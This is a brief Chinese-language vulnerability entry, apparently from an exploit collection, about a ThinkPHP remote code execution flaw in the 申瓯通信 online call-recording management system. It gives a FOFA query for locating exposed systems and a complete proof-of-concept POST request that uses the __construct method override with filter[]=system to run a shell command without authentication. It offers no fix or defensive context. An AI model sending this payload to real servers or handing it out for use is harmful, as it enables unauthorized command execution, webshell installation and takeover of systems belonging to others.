## 申瓯通信在线录音管理系统Thinkphp远程代码执行漏洞

申瓯通信在线录音管理系统存在Thinkphp远程代码执行漏洞，未经身份验证的远程攻击者可以利用此漏洞执行任意指令或写入webshell，导致服务器权限被控，造成严重威胁。

## FOFA

```
title="在线录音管理系统"
```

## poc

```
POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
s=id&_method=__construct&method=POST&filter[]=system
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407071932283.png)